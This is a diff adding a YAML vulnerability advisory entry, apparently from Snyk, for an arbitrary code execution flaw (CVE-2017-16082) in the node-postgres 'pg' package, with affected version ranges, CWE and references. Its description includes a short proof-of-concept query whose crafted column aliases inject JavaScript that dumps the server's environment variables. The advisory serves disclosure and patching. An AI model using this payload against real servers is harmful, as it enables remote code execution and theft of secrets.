@@ -1,0 +1,39 @@
+---
+- id: snykio:maven:org.webjars.npm:pg:480078
+  title: Arbitrary Code Execution
+  description: "[`pg`][1] is a non-blocking PostgreSQL client for node.js.\n\nAffected
+    versions of this package are vulnerable to Arbitrary Code\nExecution attacks.
+    When parsing results of a query, it goes through a\nform of `eval`, and with a
+    specially crafted column name, an attacker\ncan cause code to run remotely on
+    the server.\n\n**PoC:**\n\n    const { Client } = require('pg')\n    const client
+    = new Client()\n    client.connect()\n    \n    const sql = `SELECT 1 AS \"\\\\'/*\",
+    2 AS \"\\\\'*/\\n + console.log(process.env)] = null;\\n//\"`\n    \n    client.query(sql,
+    (err, res) => {\n      client.end()\n    });\n{: .language-js}\n\n\n\n[1]: https://www.npmjs.com/package/pg\n"
+  affected_package: org.webjars.npm:pg
+  vulnerable_versions:
+  - "< 2.11.2"
+  - ">= 3.0.0 < 3.6.4"
+  - ">= 4.0.0 < 4.5.7"
+  - ">= 5.0.0 < 5.2.1"
+  - ">= 6.0.0 < 6.0.5"
+  - ">= 6.1.0 < 6.1.6"
+  - ">= 6.2.0 < 6.2.5"
+  - ">= 6.3.0 < 6.3.3"
+  - ">= 6.4.0 < 6.4.2"
+  - ">= 7.0.0 < 7.0.2"
+  - ">= 7.1.0 < 7.1.2"
+  severity: high
+  package_manager: maven
+  cve:
+  - CVE-2017-16082
+  cwe:
+  - CWE-94
+  disclosed_date: 2017-08-13
+  created_date: 2017-08-13
+  last_modified_date: 2017-08-13
+  credit:
+  - Sehrope Sarkuni
+  references:
+  - https://github.com/brianc/node-postgres/issues/1408
+  - https://node-postgres.com/announcements#2017-08-12-code-execution-vulnerability
+  source_url: https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-480078
